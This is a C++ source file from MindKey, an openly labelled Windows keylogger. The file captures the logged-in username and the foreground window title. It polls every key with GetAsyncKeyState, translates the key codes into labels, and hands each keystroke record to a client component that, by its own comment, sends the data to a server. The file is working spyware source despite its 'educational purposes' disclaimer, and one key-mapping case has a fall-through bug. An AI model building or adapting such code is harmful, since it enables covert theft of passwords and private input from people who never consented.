/* MindKey, Keylogger for Windows.
 * While this program can potentially be used for nefarious purposes,
 * it was written for educational and recreational purposes only
 * and the author does not endorse illegal use.
 *
 * Copyright (C) 2013 - 2014 Blackhack <https://github.com/blackhack/MindKey/>
 * Copyright (C) 2009 TheFox@fox21.at
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */


#include "common.hpp"
#include "MindClient.h"
#include "CapturerWin.h"

#include <cstdlib>
#include <windows.h>

CapturerWin::CapturerWin(Client* client)
{
    _client = client;

    // Setting up the username.
    char username[0xFF];
    DWORD len = 0xFF;
    GetUserName(username, &len);

    _user = username;
}

void CapturerWin::run()
{
    while (1)
    {
        // get the active windowtitle
        char title[1024];
        HWND hwndHandle = GetForegroundWindow();
        GetWindowText(hwndHandle, title, 1023);

        for (unsigned char c = 1; c < 255; c++)
        {
            SHORT rv = GetAsyncKeyState(c);

            if (rv & 1) // on press button down
            {
                // Create the data to be sent to server.
                KeyDataStruct keyData;
                keyData.User = _user;
                keyData.WindowTitle = (strlen(title) == 0 ? "NO ACTIVE WINDOW" : title);
                keyData.Key = GeyKey(c);
                _client->AddKeyInfo(keyData);

                //std::cout << ">" << GeyKey(c) << "< (" << (unsigned)c << ")" << std::endl;
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(2)); // enough for human
    }
}

std::string CapturerWin::GeyKey(unsigned char c)
{
    std::string key;

    switch (c)
    {
        case 1:
            key = "[LMOUSE]"; // mouse left
            break;
        case 2:
            key = "[RMOUSE]"; // mouse right
        case 4:
            key = "[MMOUSE]"; // mouse middle
            break;
        case 13:
            key = "[RETURN]";
            break;
        case 16:
        case 17:
        case 18:
            key = "";
            break;
        case 160: // lastc == 16
        case 161:
            key = "[SHIFT]";
            break;
        case 162:// lastc == 17
        case 163:
            key = "[STRG]";
            break;
        case 164: // lastc == 18
            key = "[ALT]";
            break;
        case 165:
            key = "[ALT GR]";
            break;
        case 8:
            key = "[BACKSPACE]";
            break;
        case 9:
            key = "[TAB]";
            break;
        case 27:
            key = "[ESC]";
            break;
        case 33:
            key = "[PAGE UP]";
            break;
        case 34:
            key = "[PAGE DOWN]";
            break;
        case 35:
            key = "[HOME]";
            break;
        case 36:
            key = "[POS1]";
            break;
        case 37:
            key = "[ARROW LEFT]";
            break;
        case 38:
            key = "[ARROW UP]";
            break;
        case 39:
            key = "[ARROW RIGHT]";
            break;
        case 40:
            key = "[ARROW DOWN]";
            break;
        case 45:
            key = "[INS]";
            break;
        case 46:
            key = "[DEL]";
            break;
        case 91:
        case 92:
            key = "[WIN]";
            break;
        case 106:
            key = "[NUM /]";
            break;
        case 107:
            key = "[NUM +]";
            break;
        case 109:
            key = "[NUM -]";
            break;
        case 144:
            key = "[NUM]";
            break;
        case 192:
            key = "[OE]";
            break;
        case 222:
            key = "[AE]";
            break;
        case 186:
            key = "[UE]";
            break;
        case 188:
            key = ",";
            break;
        case 189:
            key = "-";
            break;
        case 190:
            key = ".";
            break;
        case 191:
            key = "#";
            break;
        case 226:
            key = "<";
            break;
        default: // Complex cases
        {
            if (c >= 96 && c <= 105)
                key = "[NUM " + intToString(c - 96) + "]";
            else if (c >= 112 && c <= 123)
                key = "[F" + intToString(c - 111) + "]";
            else if (c >= 65 && c <= 90 || c >= 48 && c <= 57 || c == 32)
                key = c;
            else // Default alpha key
                key = "[KEY: " + intToString(c) + "]";

            break;
        }
    }

    return key;
}

std::string CapturerWin::intToString(unsigned short i)
{
    std::string str = boost::lexical_cast<std::string>(i);

    return str;
}
